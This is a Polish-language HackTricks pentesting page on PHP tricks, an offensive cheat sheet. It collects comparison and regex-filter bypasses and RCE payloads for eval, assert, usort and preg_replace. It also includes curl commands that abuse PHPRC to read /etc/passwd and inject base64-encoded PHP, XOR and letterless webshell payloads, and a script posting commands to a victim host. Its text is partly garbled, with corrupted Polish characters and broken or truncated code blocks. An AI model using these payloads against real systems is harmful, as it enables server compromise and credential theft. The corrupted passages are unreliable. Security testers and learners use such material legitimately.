# Sztuczki w PHP

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>

## Powszechne lokalizacje plik贸w cookie:

To r贸wnie偶 dotyczy plik贸w cookie phpMyAdmin. 

Pliki cookie:
```
PHPSESSID
phpMyAdmin
```
Lokalizacje:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Omijanie por贸wna w PHP

### Lu藕ne por贸wnania/Type Juggling ( == )

Jeli w PHP u偶ywane jest `==`, mog wystpi przypadki, w kt贸rych por贸wnanie nie zachowuje si zgodnie z oczekiwaniami. Dzieje si tak, poniewa偶 "==" por贸wnuje tylko wartoci przeksztacone do tego samego typu, jeli chcesz r贸wnie偶 por贸wna, czy typ por贸wnywanych danych jest taki sam, musisz u偶y `===`.

Tabele por贸wna w PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Cig znak贸w, kt贸ry nie zaczyna si od liczby, jest r贸wny liczbie
* `"0xAAAA" == "43690" -> True` Cigi zo偶one z liczb w formacie dziesitnym lub szesnastkowym mo偶na por贸wna z innymi liczbami/cigami znak贸w z wynikiem True, jeli liczby byy takie same (liczby w cigu znak贸w s interpretowane jako liczby)
* `"0e3264578" == 0 --> True` Cig znak贸w rozpoczynajcy si od "0e" i zawierajcy cokolwiek bdzie r贸wny 0
* `"0X3264578" == 0X --> True` Cig znak贸w rozpoczynajcy si od "0" i zawierajcy dowoln liter (X mo偶e by dowoln liter) oraz cokolwiek dalej, bdzie r贸wny 0
* `"0e12334" == "0" --> True` Jest to bardzo interesujce, poniewa偶 w niekt贸rych przypadkach mo偶na kontrolowa wejciowy cig znak贸w "0" i pewne treci, kt贸re s haszowane i por贸wnywane do niego. Dlatego jeli mo偶esz poda warto, kt贸ra spowoduje utworzenie hasza zaczynajcego si od "0e" i bez 偶adnej litery, mo偶esz omin por贸wnanie. Mo偶esz znale藕 **ju偶 zahaszowane cigi** w tym formacie tutaj: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Dowolna litera w cigu znak贸w jest r贸wna liczbie cakowitej 0

Wicej informacji na stronie [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** r贸wnie偶 wpywa na funkcj `in_array()` domylnie (musisz ustawi na true trzeci argument, aby dokona cisego por贸wnania):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Jeli ta funkcja jest u偶ywana do **jakiejkolwiek weryfikacji uwierzytelniania** (takiej jak sprawdzanie hasa) i u偶ytkownik kontroluje jedn stron por贸wnania, mo偶e wysa pusty tablic zamiast cigu znak贸w jako warto hasa (`https://example.com/login.php/?username=admin&password[]=`) i omin t weryfikacj:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### Surowe rzucanie typ贸w

Nawet jeli jest u偶ywany `===`, mog wystpi bdy, kt贸re sprawiaj, 偶e por贸wnanie jest podatne na surowe rzucanie typ贸w. Na przykad, jeli por贸wnanie konwertuje dane na inny typ obiektu przed por贸wnaniem:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** mo偶e by u偶ywane do **sprawdzania poprawnoci danych wprowadzanych przez u偶ytkownika** (sprawdza, czy jakiekolwiek **sowo/wyra偶enie regularne** z **czarnej listy** jest **obecne** w **danych wprowadzanych przez u偶ytkownika**, a jeli nie, kod mo偶e kontynuowa swoje wykonanie).

#### Ominicie nowej linii

Jednak偶e, gdy ograniczamy pocztek wyra偶enia regularnego, `preg_match()` **sprawdza tylko pierwsz lini danych wprowadzanych przez u偶ytkownika**, wic jeli w jaki spos贸b mo偶na **przesa** dane wejciowe w **kilku liniach**, mo偶na omini t kontrol. Przykad:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Aby omin t kontrol, mo偶esz **wysa warto z zakodowanymi znakami nowej linii** (`%0A`) lub jeli mo偶esz wysa **dane JSON**, wylij je w **kilku liniach**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Znajd藕 przykad tutaj: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass bdu dugoci**

(Ten bypass zosta wypr贸bowany na PHP 5.2.5 i nie udao mi si go uruchomi na PHP 7.3.15)\
Jeli mo偶esz przesa do `preg_match()` **bardzo du偶 poprawn warto wejciow**, nie bdzie w stanie jej przetworzy i bdziesz m贸g **obej** sprawdzenie. Na przykad, jeli jest na czarnej licie JSON, mo偶esz przesa:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Przejcie przez ReDoS

Sztuczka z: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

W skr贸cie problem wystpuje, poniewa偶 funkcje `preg_*` w PHP opieraj si na [bibliotece PCRE](http://www.pcre.org/). W PCRE pewne wyra偶enia regularne s dopasowywane poprzez u偶ycie wielu rekurencyjnych wywoa, co zu偶ywa du偶o miejsca na stosie. Mo偶liwe jest ustawienie limitu na ilo dozwolonych rekursji, ale w PHP ten limit [domylnie wynosi 100 000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), co jest wicej ni偶 mieci si na stosie.

[Wtek na Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) zosta r贸wnie偶 podlinkowany w pocie, gdzie bardziej szczeg贸owo om贸wiono ten problem. Naszym zadaniem byo teraz jasne:\
**Wysa dane wejciowe, kt贸re sprawi, 偶e wyra偶enie regularne wykona ponad 100 000 rekursji, powodujc SIGSEGV, sprawiajc, 偶e funkcja `preg_match()` zwr贸ci `false`, co sprawi, 偶e aplikacja uzna, 偶e nasze dane wejciowe nie s zoliwe, rzucajc niespodziank na kocu adunku w postaci czego takiego jak `{system(<bardzoza komenda>)}` aby uzyska SSTI --> RCE --> flaga :)**.

C贸偶, w terminach wyra偶e regularnych, faktycznie nie wykonujemy 100 tys. "rekursji", ale zamiast tego liczymy "kroki wstecz", kt贸re, jak [dokumentacja PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) m贸wi, domylnie wynosz 1 000 000 (1M) w zmiennej `pcre.backtrack_limit`.\
Aby to osign, `'X'*500_001` spowoduje 1 milion krok贸w wstecz (500 tys. do przodu i 500 tys. do tyu):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Typowanie dynamiczne dla zaciemniania PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Wykonaj Po Przekierowaniu (EAR)

Jeli PHP przekierowuje na inn stron, ale nie jest wywoywana funkcja **`die`** lub **`exit`** po ustawieniu nag贸wka `Location`, PHP kontynuuje wykonywanie i docza dane do ciaa strony:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Wykorzystanie Traversal Path i Inkluzji Plik贸w

Sprawd藕:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Wicej sztuczek

* **register\_globals**: W **PHP < 4.1.1.1** lub gdy jest 藕le skonfigurowany, **register\_globals** mo偶e by aktywny (lub ich zachowanie jest imitowane). Oznacza to, 偶e w zmiennych globalnych jak $\_GET, jeli maj warto np. $\_GET\["param"]="1234", mo偶na uzyska do niej dostp za pomoc **$param**. Dlatego, wysyajc parametry HTTP, mo偶na nadpisa zmienne u偶ywane w kodzie.
* **Ciasteczka PHPSESSION z tej samej domeny s przechowywane w tym samym miejscu**, dlatego jeli w obrbie domeny **u偶ywane s r贸偶ne ciasteczka w r贸偶nych cie偶kach**, mo偶na sprawi, 偶e jedna cie偶ka **uzyska dostp do ciasteczka z innej cie偶ki**, ustawiajc warto ciasteczka z innej cie偶ki. W ten spos贸b, jeli **obie cie偶ki uzyskuj dostp do zmiennej o tej samej nazwie**, mo偶na sprawi, 偶e **warto tej zmiennej w cie偶ce 1 bdzie stosowana w cie偶ce 2**. Nastpnie cie偶ka 2 bdzie uznawa zmienne cie偶ki 1 za wa偶ne (nadajc ciasteczku nazw odpowiadajc cie偶ce 2).
* Gdy masz **nazwy u偶ytkownik贸w** u偶ytkownik贸w maszyny. Sprawd藕 adres: **/\~\<USERNAME>** aby zobaczy, czy katalogi php s aktywowane.
* [**LFI i RCE za pomoc opakowa php**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Te funkcje s zazwyczaj u偶ywane w PHP do **generowania hashy z hase** i do **sprawdzania**, czy haso jest poprawne w por贸wnaniu z hashem.\
Obsugiwane algorytmy to: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (zaczyna si od `$2y$`). Zauwa偶, 偶e **PASSWORD\_DEFAULT jest czsto takie samo jak PASSWORD\_BCRYPT.** Aktualnie **PASSWORD\_BCRYPT** ma **ograniczenie rozmiaru wejcia do 72 bajt贸w**. Dlatego, gdy pr贸bujesz zahaszowa co wikszego ni偶 72 bajty tym algorytmem, u偶yte zostanie tylko pierwsze 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Ominicie nag贸wk贸w HTTP poprzez nadu偶ycie bd贸w PHP

Jeli **strona PHP drukuje bdy i echo zwraca pewne dane wprowadzone przez u偶ytkownika**, u偶ytkownik mo偶e sprawi, 偶e serwer PHP wydrukuje pewne **treci wystarczajco dugie**, aby kiedy pr贸buje **doda nag贸wki** do odpowiedzi, serwer wywoa bd.\
W nastpujcym scenariuszu **atakujcy sprawi, 偶e serwer wywietli du偶e bdy**, i jak wida na ekranie, kiedy PHP pr贸bowao **zmodyfikowa informacje nag贸wka, nie mogo** (na przykad nag贸wek CSP nie zosta wysany do u偶ytkownika):

![](<../../../.gitbook/assets/image (465).png>)

## Wykonanie kodu

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Sprawd藕 to dla bardziej przydatnych funkcji PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/) 

### **RCE za pomoc** **preg\_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Aby wykona kod w argumencie "replace", wymagane jest co najmniej jedno dopasowanie.\
Ta opcja preg\_replace zostaa **przestarzaa od PHP 5.5.0.**

### **RCE za pomoc Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE za pomoc Assert()**

Ta funkcja w php pozwala Ci **wykona kod napisany w postaci cigu znak贸w**, aby **zwr贸ci true lub false** (i w zale偶noci od tego zmieni wykonanie). Zazwyczaj zmienna u偶ytkownika zostanie wstawiona w rodku cigu znak贸w. Na przykad:\
`assert("strpos($_GET['page']),'..') === false")` --> W tym przypadku, aby uzyska **RCE**, mo偶esz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Bdziesz musia **przerwa** skadni kodu, **doda** sw贸j **payload**, a nastpnie ponownie to **naprawi**. Mo偶esz u偶y operacji logicznych takich jak "**and" lub "%26%26" lub "|"**. Zauwa偶, 偶e "or", "||" nie dziaaj, poniewa偶 jeli pierwszy warunek jest prawdziwy, nasz payload nie zostanie wykonany. Tak samo ";" nie dziaa, poniewa偶 nasz payload nie zostanie wykonany.

**Inn opcj** jest dodanie do cigu znak贸w wykonania polecenia: `'.highlight_file('.passwd').'`

**Inn opcj** (jeli masz dostp do kodu 藕r贸dowego) jest zmodyfikowanie pewnej zmiennej w celu zmiany wykonania: `$file = "hola"`

### **RCE za pomoc usort()**

Ta funkcja su偶y do sortowania tablicy element贸w za pomoc okrelonej funkcji.\
Aby nadu偶y tej funkcji:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Mo偶esz r贸wnie偶 u偶y **//** aby skomentowa reszt kodu.

Aby odkry liczb nawias贸w, kt贸re musisz zamkn:

- `?order=id;}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ';'`). Prawdopodobnie brakuje nam jednego lub wicej nawias贸w.
- `?order=id);}//`: otrzymujemy **ostrze偶enie**. Wyglda na to, 偶e jest to poprawne.
- `?order=id));}//`: otrzymujemy komunikat o bdzie (`Parse error: syntax error, unexpected ')' i`). Prawdopodobnie mamy za du偶o zamykajcych nawias贸w.

### **RCE za pomoc .httaccess**

Jeli mo偶esz **zaadowa** plik **.htaccess**, mo偶esz **skonfigurowa** kilka rzeczy, a nawet wykona kod (konfigurujc, 偶e pliki z rozszerzeniem .htaccess mog by **wykonywane**).

R贸偶ne powoki .htaccess mo偶na znale藕 [tutaj](https://github.com/wireghoul/htshells)

### RCE za pomoc zmiennych rodowiskowych

Jeli znajdziesz podatno, kt贸ra pozwala Ci **modyfikowa zmienne rodowiskowe w PHP** (i inn do wgrywania plik贸w, chocia偶 po dokadniejszym zbadaniu mo偶e to zosta obejcione), mo偶esz wykorzysta to zachowanie do uzyskania **RCE**.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ta zmienna rodowiskowa pozwala na adowanie dowolnych bibliotek podczas wykonywania innych binari贸w (cho w tym przypadku mo偶e nie dziaa).
- **`PHPRC`** : Wskazuje PHP, **gdzie znajduje si plik konfiguracyjny**, zwykle nazywany `php.ini`. Jeli mo偶esz wgra wasny plik konfiguracyjny, u偶yj `PHPRC` aby wskaza PHP na niego. Dodaj wpis **`auto_prepend_file`** okrelajcy drugi wgrany plik. Ten drugi plik zawiera normalny **kod PHP, kt贸ry jest nastpnie wykonywany** przez rodowisko PHP przed jakimkolwiek innym kodem.
1. Wgraj plik PHP zawierajcy nasz kod powoki
2. Wgraj drugi plik, zawierajcy dyrektyw **`auto_prepend_file`** instruujc preprocesor PHP do wykonania pliku, kt贸ry wgralimy w kroku 1
3. Ustaw zmienn `PHPRC` na plik, kt贸ry wgralimy w kroku 2.
- Uzyskaj wicej informacji na temat wykonania tego acucha [**z oryginalnego raportu**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - kolejna opcja
- Jeli **nie mo偶esz wgrywa plik贸w**, mo偶esz u偶y w FreeBSD "pliku" `/dev/fd/0`, kt贸ry zawiera **`stdin`**, bdcy **treci** 偶dania wysanego do `stdin`:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Lub aby uzyska RCE, wcz **`allow_url_include`** i dodaj plik z **kodem PHP w base64**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Technika [**z tego raportu**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Analiza statyczna PHP

Sprawd藕, czy mo偶esz wstawi kod w wywoania tych funkcji (z [tutaj](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Jeli debugujesz aplikacj PHP, mo偶esz globalnie wczy drukowanie bd贸w w `/etc/php5/apache2/php.ini`, dodajc `display_errors = On` i zrestartowa apache: `sudo systemctl restart apache2`

### Deobfuskacja kodu PHP

Mo偶esz u偶y **strony internetowej** [**www.unphp.net**](http://www.unphp.net) **do deobfuskacji kodu PHP.**

## Owiki i protokoy PHP

Owiki i protokoy PHP mog pozwoli Ci **obej zabezpieczenia zapisu i odczytu** w systemie i go skompromitowa. Aby uzyska [**wicej informacji, sprawd藕 t stron**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug nieuwierzytelniona RCE

Jeli zobaczysz, 偶e **Xdebug** jest **wczony** w wyniku `phpconfig()`, powiniene spr贸bowa uzyska RCE za pomoc [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Zmienne zmiennych
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE wykorzystujce nowe $\_GET\["a"]\($\_GET\["b"])

Jeli na stronie mo偶esz **utworzy nowy obiekt dowolnej klasy**, mo偶esz by w stanie uzyska RCE, sprawd藕 nastpn stron, aby dowiedzie si jak:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Wykonanie PHP bez liter

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### U偶ycie 贸semkowego
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (exclusive OR) is a bitwise operation that is commonly used in cryptography and programming. In XOR operation, the result is true only when the inputs differ (one is true, the other is false). XOR can be used in various ways in programming and encryption to manipulate data and create secure algorithms.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If 垄___ not needed then $_($__), show_source(.passwd)
```
### Kod powoki XOR

Zgodnie z [**tym opisem**](https://mgp25.com/ctf/Web-challenge/), mo偶na wygenerowa prosty kod powoki w ten spos贸b:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Wic jeli mo偶esz **wykona dowolne polecenie PHP bez liczb i liter**, mo偶esz wysa 偶danie, jak poni偶ej, nadu偶ywajc tego adunku, aby wykona dowolne polecenie PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Dla bardziej szczeg贸owego wyjanienia sprawd藕 [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Kod powoki XOR (wewntrz eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Podobne do Perla
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF** sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
